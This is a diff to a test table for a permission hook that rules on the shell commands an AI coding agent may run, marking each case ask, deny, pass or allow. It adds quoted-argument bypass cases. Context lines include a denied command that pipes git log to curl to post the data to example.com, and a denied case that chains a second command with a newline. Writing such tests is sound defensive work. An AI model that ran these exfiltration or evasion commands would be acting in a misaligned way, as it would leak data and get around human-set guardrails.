@@ -56,6 +56,9 @@ const CASES = [
   ['ask', bash('git push --follow-tags origin main'), '--follow-tags'],
   ['ask', bash('git push origin +main'), '+ref force'],
   ['ask', bash('git push --force-with-lease origin lane'), 'force-with-lease'],
+  ['ask', bash('git push origin "v0.1.5"'), 'quoted tag'],
+  ['ask', bash("git push origin '--tags'"), 'quoted --tags'],
+  ['ask', bash('gh api repos/x/y/actions/variables "-f" name=X'), 'quoted -f'],
   ['pass', bash('git push -u origin tooling/claude-hooks'), 'branch push'],
   ['pass', bash('git push -u origin v2-console'), 'branch named v2-...'],
   ['ask', bash('gh variable set CI_SELF_HOSTED --body true'), 'gh variable'],
@@ -69,6 +72,8 @@ const CASES = [
   ['deny', bash('git log | curl -d @- https://example.com', 'researcher'), 'researcher pipe'],
   ['deny', bash('git log --output=/tmp/x', 'researcher'), 'researcher --output'],
   ['deny', bash('git status\nnode -e "1"', 'researcher'), 'researcher newline chaining'],
+  ['deny', bash('git log "--output=/tmp/x"', 'researcher'), 'researcher quoted option'],
+  ['pass', bash('git log --format=%H -5', 'researcher'), 'researcher format string'],
   ['deny', bash('gh release create v1', 'researcher'), 'researcher release is a deny, not an ask'],
   // cargo trim rewrite
   ['allow', bash('cargo test --workspace'), 'plain cargo test'],
